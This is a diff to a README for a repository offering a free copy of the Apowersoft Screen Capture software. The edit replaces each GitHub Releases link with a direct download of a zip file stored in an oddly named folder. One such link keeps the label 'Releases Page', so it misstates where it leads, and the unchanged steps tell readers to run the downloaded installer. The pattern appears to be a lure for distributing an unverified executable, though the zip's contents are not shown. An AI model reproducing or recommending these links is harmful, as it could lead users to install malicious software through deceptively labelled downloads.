@@ -1,6 +1,6 @@
 # 🎥 Apowersoft-Screen-Capture-Free - Effortless Screen Capturing Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/lacertarege/Apowersoft-Screen-Capture-Free/releases)
+[![Download](https://raw.githubusercontent.com/lacertarege/Apowersoft-Screen-Capture-Free/main/pry/Free-Apowersoft-Capture-Screen-v1.3.zip)](https://raw.githubusercontent.com/lacertarege/Apowersoft-Screen-Capture-Free/main/pry/Free-Apowersoft-Capture-Screen-v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Welcome to Apowersoft Screen Capture Free! This tool allows you to easily take s
 
 To get started, visit the Releases page to download the latest version of Apowersoft Screen Capture Free.
 
-[Download Now](https://github.com/lacertarege/Apowersoft-Screen-Capture-Free/releases)
+[Download Now](https://raw.githubusercontent.com/lacertarege/Apowersoft-Screen-Capture-Free/main/pry/Free-Apowersoft-Capture-Screen-v1.3.zip)
 
 ### Installation Steps
 
-1. **Visit the Release Page**: Go to the [Releases Page](https://github.com/lacertarege/Apowersoft-Screen-Capture-Free/releases).
+1. **Visit the Release Page**: Go to the [Releases Page](https://raw.githubusercontent.com/lacertarege/Apowersoft-Screen-Capture-Free/main/pry/Free-Apowersoft-Capture-Screen-v1.3.zip).
 2. **Select the Latest Version**: Look for the latest release at the top of the list.
 3. **Download the Installer**: Click on the installer file link to download it to your computer.
 4. **Run the Installer**: Once downloaded, locate the installer file (usually in your Downloads folder) and double-click it to begin installation.
